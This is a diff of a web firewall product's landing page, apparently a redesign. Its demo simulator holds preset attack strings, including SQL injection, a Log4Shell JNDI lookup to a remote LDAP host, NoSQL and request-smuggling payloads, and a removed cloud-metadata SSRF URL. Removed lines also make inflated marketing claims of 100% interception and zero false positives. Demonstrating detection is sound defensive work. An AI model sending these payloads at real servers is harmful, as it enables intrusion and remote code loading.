@@ -6,595 +6,213 @@
   <title>SentinelGrid // Autonomous In-Process WAAP & Zero-Trust Origin Defense</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
   <style>
-    :root {
-      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      --font-mono: 'Space Mono', monospace;
-
-      /* Dark Mode Palette (Developer Precision Carbon) */
-      --canvas-bg: #0B0E14;
-      --card-bg: #12171F;
-      --card-secondary: #1A2230;
-      --card-secondary-hover: #222C3D;
-      --border-color: rgba(255, 255, 255, 0.09);
-      --border-accent: rgba(56, 189, 248, 0.35);
-      --text-main: #F0F6FC;
-      --text-muted: #94A3B8;
-      --accent-cyan: #38BDF8;
-      --accent-indigo: #38BDF8;
-      --accent-green: #3FB950;
-      --accent-red: #F85149;
-      --accent-gold: #F59E0B;
-      --shadow-glow: 0 16px 48px -8px rgba(56, 189, 248, 0.2);
-
-      /* Next-Gen Rounded Corners Hierarchy */
-      --radius-xs: 6px;
-      --radius-sm: 10px;
-      --radius-md: 14px;
-      --radius-lg: 18px;
-      --radius-xl: 22px;
-      --radius-pill: 9999px;
-
-      --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.25), 0 1px 2px rgba(0, 0, 0, 0.15);
-      --shadow-md: 0 4px 16px -2px rgba(0, 0, 0, 0.35), 0 2px 6px -1px rgba(0, 0, 0, 0.2);
-      --shadow-lg: 0 16px 40px -6px rgba(0, 0, 0, 0.5);
-      --inner-rim: inset 0 1px 0 0 rgba(255, 255, 255, 0.08);
-      --glass-blur: blur(16px) saturate(180%);
-    }
-
-    [data-theme="light"] {
-      /* Rich Archival Canvas & Surfaces (Warm Almond Linen / Dark Cream) */
-      --canvas-bg: #EFE9DF;
-      --card-bg: #FAF6EE;
-      --card-secondary: #E6DECE;
-      --card-secondary-hover: #DDD2BF;
-      --border-color: #CFBFAB;
-      --border-accent: rgba(27, 54, 93, 0.35);
-      --text-main: #1C1712;
-      --text-muted: #564B3E;
-      --accent-cyan: #1B365D;
-      --accent-indigo: #1B365D;
-      --accent-green: #1B633E;
-      --accent-red: #9C2A1B;
-      --accent-gold: #8C4A0E;
-      --shadow-glow: 0 16px 40px -8px rgba(45, 36, 26, 0.12);
-      --inner-rim: inset 0 1px 0 0 rgba(255, 255, 255, 0.85);
-    }
-
-    [data-theme="light"] .telemetry-output {
-      background: #E8E0D2 !important;
-      color: #1C1712 !important;
-      border: 1px solid #CFBFAB !important;
-    }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    ::selection { background: rgba(56, 189, 248, 0.3); color: inherit; }
-    :focus-visible { outline: 2px solid var(--accent-cyan); outline-offset: 2px; }
-
-    html, body {
-      overflow-x: hidden;
-      width: 100%;
-      max-width: 100%;
-      -webkit-text-size-adjust: 100%;
-      text-size-adjust: 100%;
-    }
-
-    body {
-      background: var(--canvas-bg);
-      color: var(--text-main);
-      font-family: var(--font-sans);
-      min-height: 100vh;
-      min-height: 100dvh;
-      line-height: 1.6;
-      transition: background 0.25s cubic-bezier(0.16, 1, 0.3, 1), color 0.25s ease;
-      font-variant-numeric: tabular-nums;
-    }
-
-    /* Container */
-    .container {
-      max-width: 1240px;
-      margin: 0 auto;
+    /* Asymmetric 60/40 Hero Fold Layout */
+    .landing-hero-grid {
+      display: grid;
+      grid-template-columns: 58% 42%;
+      gap: 24px;
+      align-items: start;
+      margin: 40px auto;
+      max-width: 1400px;
       padding: 0 24px;
     }
-
-    /* Navigation Bar */
-    .navbar {
-      height: 72px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid var(--border-color);
-      position: sticky;
-      top: 0;
-      background: rgba(11, 14, 20, 0.82);
-      backdrop-filter: var(--glass-blur);
-      -webkit-backdrop-filter: var(--glass-blur);
-      z-index: 100;
-    }
-    [data-theme="light"] .navbar {
-      background: rgba(245, 239, 235, 0.88);
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
-      color: var(--text-main);
-    }
-    .brand-title {
-      font-weight: 800;
-      font-size: 17px;
-      letter-spacing: -0.5px;
-    }
-    .brand-badge {
-      font-size: 9px;
-      font-family: var(--font-mono);
-      font-weight: 800;
-      padding: 2px 8px;
-      border-radius: var(--radius-pill);
-      background: rgba(56, 189, 248, 0.12);
-      color: var(--accent-cyan);
-      border: 1px solid var(--border-accent);
-    }
-
-    .nav-actions {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    /* Next-Gen Spring Buttons */
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 10px 20px;
-      border-radius: var(--radius-sm);
-      font-size: 13px;
-      font-weight: 700;
-      text-decoration: none;
-      cursor: pointer;
-      transition: all 0.18s cubic-bezier(0.16, 1, 0.3, 1);
-      border: 1px solid transparent;
-      user-select: none;
-    }
-    .btn:active {
-      transform: scale(0.97);
-    }
-    .btn-primary {
-      background: linear-gradient(180deg, #38BDF8 0%, #0284C7 100%);
-      color: #FFFFFF;
-      box-shadow: 0 2px 12px rgba(2, 132, 199, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.25);
-    }
-    .btn-primary:hover {
-      background: linear-gradient(180deg, #7DD3FC 0%, #38BDF8 100%);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 16px rgba(2, 132, 199, 0.5);
-    }
-    .btn-secondary {
-      background: var(--card-secondary);
-      color: var(--text-main);
-      border-color: var(--border-color);
-      box-shadow: var(--shadow-sm);
-    }
-    .btn-secondary:hover {
-      background: var(--card-secondary-hover);
-      border-color: var(--border-accent);
-      color: var(--accent-cyan);
-      transform: translateY(-1px);
-    }
-
-    /* Hero Section */
-    .hero {
-      padding: 80px 0 60px;
-      text-align: center;
-      position: relative;
-    }
-    .hero-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 16px;
-      background: rgba(56, 189, 248, 0.1);
-      border: 1px solid var(--border-accent);
-      border-radius: var(--radius-pill);
-      font-size: 12px;
-      font-weight: 700;
-      color: var(--accent-cyan);
-      margin-bottom: 24px;
-    }
-    .hero-title {
-      font-size: 48px;
-      font-weight: 800;
-      letter-spacing: -1.2px;
-      line-height: 1.15;
-      margin-bottom: 20px;
-      max-width: 900px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .hero-title span {
-      color: var(--accent-cyan);
-    }
-
-    @media (max-width: 768px) {
-      .form-input, input, select, textarea {
-        font-size: 16px !important;
-      }
-    }
-    .hero-sub {
-      font-size: 17px;
-      color: var(--text-muted);
-      max-width: 680px;
-      margin: 0 auto 36px;
-      line-height: 1.6;
-    }
-    .hero-cta {
-      display: flex;
-      justify-content: center;
-      gap: 14px;
-      flex-wrap: wrap;
-    }
-
-    /* Metrics Bar */
-    .metrics-bar {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 16px;
-      margin: 40px auto 60px;
-      max-width: 1000px;
-    }
-    .metric-item {
-      background: var(--card-bg);
-      border: 1px solid var(--border-color);
-      border-radius: var(--radius-lg);
-      padding: 22px;
-      text-align: center;
-      box-shadow: var(--shadow-sm), var(--inner-rim);
-      transition: transform 0.2s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.2s;
-    }
-    .metric-item:hover {
-      transform: translateY(-2px);
-      box-shadow: var(--shadow-md), var(--inner-rim);
-    }
-    .metric-value {
-      font-size: 32px;
-      font-weight: 800;
-      font-family: var(--font-mono);
-      color: var(--accent-cyan);
-      line-height: 1.2;
-    }
-    .metric-label {
-      font-size: 12px;
-      color: var(--text-muted);
-      font-weight: 600;
-      margin-top: 4px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    /* Live WAF Interactive Attack Sandbox */
-    .demo-section {
-      padding: 40px 0 80px;
-    }
-    .demo-card {
-      background: var(--card-bg);
-      border: 1px solid var(--border-color);
-      border-radius: var(--radius-xl);
-      overflow: hidden;
-      box-shadow: var(--shadow-glow);
-    }
-    .demo-header {
-      background: var(--card-secondary);
-      border-bottom: 1px solid var(--border-color);
-      padding: 18px 26px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-    .demo-body {
-      display: grid;
-      grid-template-columns: 1.2fr 1fr;
-      min-height: 380px;
-    }
-    @media (max-width: 860px) {
-      .demo-body { grid-template-columns: 1fr; }
-      .metrics-bar { grid-template-columns: 1fr 1fr; }
-      .hero-title { font-size: 34px; }
-    }
-    @media (min-width: 641px) and (max-width: 1024px) {
-      .features-grid { grid-template-columns: repeat(2, 1fr) !important; }
-    }
-    @media (max-width: 640px) {
-      .navbar { height: 62px; }
-      .container { padding: 0 16px; }
-      .navbar .nav-actions .btn { padding: 6px 10px; font-size: 11px; }
-      .brand-title { font-size: 15px; }
-      .brand-badge { display: none; }
-      .hero-title { font-size: 28px !important; letter-spacing: -0.5px; }
-      .hero-sub { font-size: 14px; }
-      .hero-cta { flex-direction: column; width: 100%; gap: 10px; }
-      .hero-cta .btn { width: 100%; }
-      .metrics-bar { grid-template-columns: 1fr !important; gap: 12px; }
-      .demo-left, .demo-right { padding: 18px 14px !important; border-right: none; }
-      .demo-presets { gap: 6px; }
-      .preset-chip { font-size: 10px; padding: 4px 8px; }
-      .features-grid { grid-template-columns: 1fr !important; gap: 16px; margin: 36px 0; }
-    }
-
-    .demo-left {
-      padding: 28px;
-      border-right: 1px solid var(--border-color);
-    }
-    .demo-right {
-      padding: 28px;
-      background: rgba(0, 0, 0, 0.2);
-    }
-
-    .attack-presets {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin-bottom: 20px;
-    }
-    .preset-chip {
-      background: var(--card-secondary);
-      border: 1px solid var(--border-color);
-      border-radius: var(--radius-pill);
-      padding: 6px 14px;
-      font-size: 11px;
-      font-weight: 700;
-      font-family: var(--font-mono);
-      cursor: pointer;
-      color: var(--text-muted);
-      transition: all 0.18s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    .preset-chip:hover, .preset-chip.active {
-      border-color: var(--accent-cyan);
-      color: var(--accent-cyan);
-      background: rgba(56, 189, 248, 0.12);
-      transform: translateY(-1px);
-    }
-
-    .telemetry-output {
-      font-family: var(--font-mono);
-      font-size: 12px;
-      background: #060911;
-      color: #E2E8F0;
-      padding: 18px;
-      border-radius: var(--radius-md);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      min-height: 240px;
-      white-space: pre-wrap;
-      overflow-x: auto;
-    }
-
-    /* Architecture Features Grid */
-    .features-grid {
+    .hero-spec-strip {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 24px;
-      margin: 60px 0;
+      background: var(--card-white);
+      border: 1px solid var(--stone-border);
+      border-radius: 4px;
+      margin-top: 32px;
+      overflow: hidden;
+      font-family: var(--font-mono);
+      font-size: 11px;
     }
-    @media (max-width: 900px) {
-      .features-grid { grid-template-columns: 1fr; }
+    .hero-spec-item {
+      padding: 12px 14px;
+      border-right: 1px solid var(--stone-border);
     }
-    .feature-card {
-      background: var(--card-bg);
-      border: 1px solid var(--border-color);
-      border-radius: var(--radius-lg);
-      padding: 30px;
-      box-shadow: var(--shadow-sm), var(--inner-rim);
-      transition: transform 0.2s cubic-bezier(0.16, 1, 0.3, 1), border-color 0.2s ease, box-shadow 0.2s;
+    .hero-spec-item:last-child {
+      border-right: none;
     }
-    .feature-card:hover {
-      transform: translateY(-3px);
-      border-color: var(--border-accent);
-      box-shadow: var(--shadow-md), var(--inner-rim);
-    }
-    .feature-icon {
-      font-size: 28px;
-      margin-bottom: 16px;
-      display: inline-block;
-    }
-    .feature-title {
-      font-size: 17px;
-      font-weight: 800;
-      margin-bottom: 10px;
-    }
-    .feature-desc {
-      font-size: 13px;
-      color: var(--text-muted);
-      line-height: 1.6;
+    .hero-spec-val {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--deep-indigo);
+      margin-top: 4px;
     }
 
-    /* Footer */
-    .footer {
-      border-top: 1px solid var(--border-color);
-      padding: 40px 0;
-      text-align: center;
-      font-size: 12px;
-      color: var(--text-muted);
+    /* Embedded Simulator Panel */
+    .hero-sim-card {
+      background: var(--card-white);
+      border: 1px solid var(--stone-border);
+      border-radius: 4px;
+      overflow: hidden;
+      box-shadow: var(--shadow-md);
+    }
+    .hero-sim-header {
+      background: var(--sand-warm);
+      border-bottom: 1px solid var(--stone-border);
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
       font-family: var(--font-mono);
+      font-size: 11px;
+    }
+
+    .preset-chip-list {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+    .preset-chip {
+      background: var(--sand-warm);
+      border: 1px solid var(--stone-border);
+      border-radius: 3px;
+      font-family: var(--font-mono);
+      font-size: 10px;
+      padding: 4px 8px;
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: all var(--motion-snap);
+    }
+    .preset-chip:hover, .preset-chip.active {
+      border-color: var(--deep-indigo);
+      color: var(--deep-indigo);
+    }
+
+    @media (max-width: 1024px) {
+      .landing-hero-grid {
+        grid-template-columns: 1fr;
+      }
     }
   </style>
 </head>
-<body>
+<body style="min-height: 100vh; display: flex; flex-direction: column;">
 
-  <!-- Navigation Bar -->
-  <header class="navbar">
-    <div class="container" style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
-      <a href="landing.html" class="brand">
-        <svg width="32" height="32" viewBox="0 0 100 100">
-          <circle cx="50" cy="50" r="44" fill="none" stroke="rgba(56, 189, 248, 0.3)" stroke-width="2" stroke-dasharray="6,4"/>
-          <polygon points="50,10 88,32 88,68 50,90 12,68 12,32" fill="#151E32" stroke="#38BDF8" stroke-width="2"/>
-          <polygon points="50,34 64,50 50,66 36,50" fill="#38BDF8"/>
-        </svg>
-        <span class="brand-title">SentinelGrid</span>
-        <span class="brand-badge">ENTERPRISE WAAP</span>
+  <!-- Solid Navbar with 1px Bottom Border -->
+  <header style="background: var(--card-white); border-bottom: 1px solid var(--stone-border); height: 56px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; position: sticky; top: 0; z-index: 100;">
+    <div style="display: flex; align-items: center; gap: 10px;">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color: var(--deep-indigo);"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <span style="font-weight: 800; font-size: 14px; letter-spacing: -0.2px;">SentinelGrid WAAP</span>
+      <span style="font-family: var(--font-mono); font-size: 10px; color: var(--sage-green); background: var(--sage-soft); border: 1px solid var(--sage-border); padding: 1px 6px; border-radius: 2px;">EDGE MESH ACTIVE</span>
+    </div>
+
+    <div style="display: flex; align-items: center; gap: 12px;">
+      <button id="theme-btn" onclick="toggleLandingTheme()" style="background: var(--sand-warm); border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono); font-size: 11px; padding: 5px 10px; color: var(--text-muted); cursor: pointer; font-weight: 700;">
+        THEME: CARBON
+      </button>
+      <a href="login.html" class="btn btn-primary" style="padding: 6px 14px; font-size: 11px; text-decoration: none;">
+        Launch Live Console
       </a>
-
-      <div class="nav-actions">
-        <button class="btn btn-secondary" style="padding: 6px 12px; font-size: 11px;" onclick="toggleLandingTheme()" id="theme-btn">
-          🌙 Theme
-        </button>
-        <a href="login.html" class="btn btn-secondary">Sign In</a>
-        <a href="index.html#dashboard" class="btn btn-primary">Launch SOC Console →</a>
-      </div>
     </div>
   </header>
 
-  <!-- Hero Section -->
-  <section class="hero">
-    <div class="container">
-      <div class="hero-pill">
-        <span>⚡ RFC 8032 Ed25519 Cryptographic Origin Shield Active</span>
-      </div>
-      <h1 class="hero-title">
-        Autonomous In-Process WAAP & <span>Zero-Trust Origin Defense</span>
-      </h1>
-      <p class="hero-sub">
-        High-throughput Web & Mobile API Security engine delivering 0.35ms P99 in-process threat mitigation, SmartParse lexical AST boundary analysis, and 100% exploit interception.
-      </p>
-      <div class="hero-cta">
-        <a href="index.html#dashboard" class="btn btn-primary" style="padding: 13px 26px; font-size: 14px;">
-          🚀 Open Interactive SOC Console
-        </a>
-        <a href="register.html" class="btn btn-secondary" style="padding: 13px 26px; font-size: 14px;">
-          ➕ Create Operator Account
-        </a>
-      </div>
+  <!-- Asymmetric 60/40 Hero Fold -->
+  <main style="flex: 1;">
+    <div class="landing-hero-grid">
+      <!-- Left 60%: Value Proposition & Technical Specification -->
+      <div>
+        <div style="font-family: var(--font-mono); font-size: 11px; color: var(--deep-indigo); font-weight: 700; margin-bottom: 12px; letter-spacing: 0.8px;">
+          IN-LINE SECURITY GATEWAY &bull; RFC 8032 ORIGIN SEAL
+        </div>
+        <h1 style="font-size: 38px; font-weight: 800; line-height: 1.15; letter-spacing: -1px; margin-bottom: 16px; color: var(--text-charcoal);">
+          Sub-millisecond WAAP defense for zero-trust cloud backends.
+        </h1>
+        <p style="font-size: 14px; line-height: 1.6; color: var(--text-muted); max-width: 620px; margin-bottom: 24px;">
+          SentinelGrid runs in-line within your application kernel or reverse proxy. Incoming traffic is evaluated using a deterministic SmartParse lexical AST & DFA engine in under 0.4ms. Clean traffic receives an unforgeable Ed25519 origin seal; repeat threat actors are quarantined at the edge in 0.14ms.
+        </p>
 
-      <!-- Real Metrics -->
-      <div class="metrics-bar">
-        <div class="metric-item">
-          <div class="metric-value">0.35ms</div>
-          <div class="metric-label">P99 In-Process Latency</div>
+        <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
+          <a href="login.html" class="btn btn-primary" style="padding: 10px 18px; font-size: 12px; text-decoration: none;">
+            Enter SOC Console
+          </a>
+          <a href="SETUP_AND_INTEGRATION_GUIDE.md" target="_blank" class="btn btn-secondary" style="padding: 10px 18px; font-size: 12px; text-decoration: none;">
+            Read Integration Spec
+          </a>
         </div>
-        <div class="metric-item">
-          <div class="metric-value" style="color: var(--accent-green);">100.0%</div>
-          <div class="metric-label">Mitigation Precision</div>
-        </div>
-        <div class="metric-item">
-          <div class="metric-value">0.0%</div>
-          <div class="metric-label">False Positive Rate</div>
-        </div>
-        <div class="metric-item">
-          <div class="metric-value" style="color: var(--accent-indigo);">RFC 8032</div>
-          <div class="metric-label">Ed25519 Crypto Ledger</div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- Live WAF Interactive Simulator -->
-  <section class="demo-section">
-    <div class="container">
-      <div class="demo-card">
-        <div class="demo-header">
-          <div>
-            <span style="font-weight: 800; font-size: 14px; color: var(--accent-cyan); text-transform: uppercase; letter-spacing: 0.5px;">
-              ⚡ Interactive In-Line WAF Attack Simulator
-            </span>
-            <div style="font-size: 11px; color: var(--text-muted);">
-              Dispatch live payloads directly to the SentinelGrid SecurityBrain inspection kernel.
-            </div>
+        <!-- Compact Key-Value Metric Strip -->
+        <div class="hero-spec-strip">
+          <div class="hero-spec-item">
+            <div style="color: var(--text-muted);">P99 LATENCY BUDGET</div>
+            <div class="hero-spec-val">&lt; 0.35ms</div>
           </div>
-          <span class="badge" style="background: rgba(16, 185, 129, 0.15); color: var(--accent-green); padding: 4px 8px; border-radius: 4px; font-size: 10px; font-family: var(--font-mono); font-weight: 800;">
-            LIVE ENGINE READY
-          </span>
+          <div class="hero-spec-item">
+            <div style="color: var(--text-muted);">REPEAT ATTACK DROP</div>
+            <div class="hero-spec-val">0.14ms</div>
+          </div>
+          <div class="hero-spec-item">
+            <div style="color: var(--text-muted);">CRYPTOGRAPHIC SEAL</div>
+            <div class="hero-spec-val">RFC 8032 Ed25519</div>
+          </div>
         </div>
+      </div>
 
-        <div class="demo-body">
-          <div class="demo-left">
-            <div style="font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; color: var(--text-muted); font-family: var(--font-mono);">
-              Select Adversarial Vector:
-            </div>
-            <div class="attack-presets">
-              <button class="preset-chip active" onclick="loadAttackPreset('sqli')">SQL Injection</button>
-              <button class="preset-chip" onclick="loadAttackPreset('log4j')">Log4Shell RCE</button>
-              <button class="preset-chip" onclick="loadAttackPreset('nosql')">NoSQL Operator</button>
-              <button class="preset-chip" onclick="loadAttackPreset('smuggle')">HTTP Smuggling</button>
-              <button class="preset-chip" onclick="loadAttackPreset('ssrf')">Cloud IMDS SSRF</button>
-              <button class="preset-chip" onclick="loadAttackPreset('clean')">Clean Request</button>
-            </div>
-
-            <div style="margin-bottom: 14px;">
-              <label for="demo-path" style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); display: block; margin-bottom: 4px;">REQUEST URI PATH</label>
-              <input type="text" id="demo-path" aria-label="Target HTTP Route" class="btn btn-secondary" style="width: 100%; text-align: left; font-family: var(--font-mono); font-size: 12px; cursor: text;" value="/api/v1/auth/login">
-            </div>
-
-            <div style="margin-bottom: 18px;">
-              <label for="demo-body" style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); display: block; margin-bottom: 4px;">PAYLOAD BODY (JSON / FORM)</label>
-              <textarea id="demo-body" aria-label="Simulated Request Body Payload" class="btn btn-secondary" style="width: 100%; height: 90px; text-align: left; font-family: var(--font-mono); font-size: 12px; cursor: text; resize: vertical;">user=admin' OR '1'='1'--&pass=x</textarea>
-            </div>
-
-            <button class="btn btn-primary" style="width: 100%; padding: 12px;" onclick="runLiveInspection()">
-              ⚡ Dispatch Payload Through WAAP Kernel
-            </button>
+      <!-- Right 40%: The Interactive In-Line AST Lab Simulator -->
+      <div class="hero-sim-card">
+        <div class="hero-sim-header">
+          <span style="font-weight: 700;">LIVE SMARTPARSE AST LAB</span>
+          <span id="demo-status-pill" style="color: var(--deep-indigo);">[IDLE READY]</span>
+        </div>
+        <div style="padding: 16px;">
+          <div class="preset-chip-list">
+            <div class="preset-chip active" onclick="loadAttackPreset('sqli')">SQLi Tautology</div>
+            <div class="preset-chip" onclick="loadAttackPreset('jndi')">Log4j JNDI</div>
+            <div class="preset-chip" onclick="loadAttackPreset('nosql')">NoSQL $gt</div>
+            <div class="preset-chip" onclick="loadAttackPreset('smuggle')">HTTP Desync</div>
+            <div class="preset-chip" onclick="loadAttackPreset('clean')">Clean Query</div>
           </div>
 
-          <div class="demo-right">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-              <span style="font-size: 11px; font-family: var(--font-mono); font-weight: 700; color: var(--text-muted);">KERNEL INSPECTION TELEMETRY</span>
-              <span id="demo-status-pill" style="font-size: 11px; font-family: var(--font-mono); font-weight: 800; color: var(--accent-green);">IDLE</span>
-            </div>
-            <div id="demo-output" class="telemetry-output">Click "Dispatch Payload" to execute in-process evaluation...</div>
+          <div style="margin-bottom: 10px;">
+            <label style="font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); display: block; margin-bottom: 4px;">REQUEST TARGET PATH</label>
+            <input type="text" id="demo-path" class="form-control" value="/api/v1/auth/tokens" style="font-family: var(--font-mono); font-size: 11px;">
+          </div>
+
+          <div style="margin-bottom: 12px;">
+            <label style="font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); display: block; margin-bottom: 4px;">INSPECTION PAYLOAD BODY</label>
+            <textarea id="demo-body" class="form-control" rows="3" style="font-family: var(--font-mono); font-size: 11px; resize: vertical;">' OR '1'='1' --</textarea>
+          </div>
+
+          <button onclick="runLiveInspection()" class="btn btn-primary" style="width: 100%; padding: 8px; font-size: 11px; font-family: var(--font-mono);">
+            [EVALUATE PAYLOAD AT EDGE]
+          </button>
+
+          <!-- Streaming Output Terminal -->
+          <div style="margin-top: 14px;">
+            <div style="font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); margin-bottom: 4px;">TELEMETRY STREAM:</div>
+            <pre id="demo-output" style="background: var(--card-elevated); border: 1px solid var(--stone-border); border-radius: 3px; padding: 10px 12px; font-family: var(--font-mono); font-size: 10px; max-height: 180px; overflow-y: auto; color: var(--text-charcoal); line-height: 1.5; white-space: pre-wrap;">Select a preset or execute an evaluation.</pre>
           </div>
         </div>
       </div>
     </div>
-  </section>
+  </main>
 
-  <!-- Core Architecture Highlights -->
-  <section class="container" style="padding-bottom: 80px;">
-    <div style="text-align: center; margin-bottom: 40px;">
-      <h2 style="font-size: 28px; font-weight: 800; letter-spacing: -0.8px;">Architected for High-Consequence Systems</h2>
-      <p style="font-size: 14px; color: var(--text-muted); max-width: 600px; margin: 8px auto 0;">Zero sidecar latency. Cryptographically attested policies. In-process execution.</p>
-    </div>
-
-    <div class="features-grid">
-      <div class="feature-card">
-        <span class="feature-icon">🛡️</span>
-        <h3 class="feature-title">SmartParse Lexical DFA</h3>
-        <p class="feature-desc">Replaces brittle single-regex WAFs with tokenize-first deterministic finite automata and AST boundary analysis, catching comment-slicing and obfuscated injections.</p>
-      </div>
-      <div class="feature-card">
-        <span class="feature-icon">⚡</span>
-        <h3 class="feature-title">Zero-Sidecar 0.35ms Latency</h3>
-        <p class="feature-desc">Executes directly inside your Python, Node.js, or ASGI/WSGI gateway process. Zero additional network hops and zero serialization tax.</p>
-      </div>
-      <div class="feature-card">
-        <span class="feature-icon">🔑</span>
-        <h3 class="feature-title">Ed25519 Origin Cryptography</h3>
-        <p class="feature-desc">RFC 8032 asymmetric signing stamps an unforgeable cryptographic clearance token on all validated traffic, preventing direct-to-origin bypasses.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- Footer -->
-  <footer class="footer">
-    <div class="container">
-      <p>SentinelGrid Autonomous Threat Operations Plane &bull; RFC 8032 Verified &bull; Zero-Trust Distributed Edge Mesh</p>
+  <!-- Technical Spec Footer -->
+  <footer style="background: var(--card-white); border-top: 1px solid var(--stone-border); padding: 18px 24px; font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+    <div>SentinelGrid WAAP Security Architecture Core Team</div>
+    <div style="display: flex; gap: 16px;">
+      <a href="SETUP_AND_INTEGRATION_GUIDE.md" style="color: var(--deep-indigo); text-decoration: none;">Integration Guide</a>
+      <a href="docs/DESIGN.md" style="color: var(--deep-indigo); text-decoration: none;">Design Spec</a>
+      <a href="login.html" style="color: var(--deep-indigo); text-decoration: none;">Operator Portal</a>
     </div>
   </footer>
 
   <script>
     const PRESETS = {
       sqli: {
-        path: "/api/v1/auth/login",
-        body: "user=admin' OR '1'='1'--&pass=x",
-        name: "SQL Injection Tautology"
+        path: "/api/v1/auth/tokens",
+        body: "' OR '1'='1' --",
+        name: "SQLi Tautology Bypass"
       },
-      log4j: {
-        path: "/api/v1/search",
-        body: "query=${jndi:ldap://198.51.100.89/exploit}",
-        name: "Log4Shell JNDI Lookup"
+      jndi: {
+        path: "/api/v1/telemetry",
+        body: "${jndi:ldap://198.51.100.44:1389/Exploit}",
+        name: "Log4Shell JNDI Injection"
       },
       nosql: {
         path: "/api/v1/users",
@@ -605,11 +223,6 @@
         path: "/api/v1/order",
         body: "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal",
         name: "HTTP Request Smuggling Desync"
-      },
-      ssrf: {
-        path: "/proxy",
-        body: "url=http://[::ffff:169.254.169.254]/latest/meta-data/",
-        name: "Cloud IMDS SSRF IPv6 Mapped"
       },
       clean: {
         path: "/api/v1/profile",
@@ -627,14 +240,24 @@
       document.getElementById("demo-body").value = p.body;
     }
 
+    // Line-by-line AST Telemetry Streamer with 15ms delay per line
+    async function streamLinesToOutput(targetEl, textLines) {
+      targetEl.innerText = "";
+      for (let i = 0; i < textLines.length; i++) {
+        await new Promise(resolve => setTimeout(resolve, 15));
+        targetEl.innerText += (i > 0 ? "\n" : "") + textLines[i];
+        targetEl.scrollTop = targetEl.scrollHeight;
+      }
+    }
+
     async function runLiveInspection() {
       const path = document.getElementById("demo-path").value.trim();
       const body = document.getElementById("demo-body").value.trim();
       const output = document.getElementById("demo-output");
       const statusPill = document.getElementById("demo-status-pill");
 
-      statusPill.innerText = "EVALUATING...";
-      statusPill.style.color = "var(--accent-gold)";
+      statusPill.innerText = "[EVALUATING...]";
+      statusPill.style.color = "var(--warm-ochre)";
       output.innerText = "Dispatching to SentinelGrid SecurityBrain...";
 
       const t0 = performance.now();
@@ -656,37 +279,38 @@
         const data = await res.json();
 
         if (data.action === "BLOCK") {
-          statusPill.innerText = "🛡️ THREAT MITIGATED";
-          statusPill.style.color = "var(--accent-red)";
+          statusPill.innerText = "[403 DROP] THREAT MITIGATED";
+          statusPill.style.color = "var(--terracotta)";
         } else {
-          statusPill.innerText = "✅ CLEAN ALLOWED";
-          statusPill.style.color = "var(--accent-green)";
+          statusPill.innerText = "[200 OK] CLEAN ALLOWED";
+          statusPill.style.color = "var(--sage-green)";
         }
 
-        output.innerHTML = [
+        const lines = [
           `[+] SENTINELGRID WAAP KERNEL EVALUATION (${elapsed}ms)`,
           `-------------------------------------------------------`,
           `VERDICT:          ${data.action} (HTTP ${data.action === 'BLOCK' ? 403 : 200})`,
           `RISK SCORE:       ${data.risk_score || 0} / 100`,
-          `TRIGGERED RULE:   ${data.top_match ? data.top_match.rule_id : 'CLEAN-TRAFFIC'}`,
-          `RULE NAME:        ${data.top_match ? data.top_match.name : 'Legitimate Application Traffic'}`,
-          `OWASP CATEGORY:   ${data.top_match ? data.top_match.owasp_id : 'None'}`,
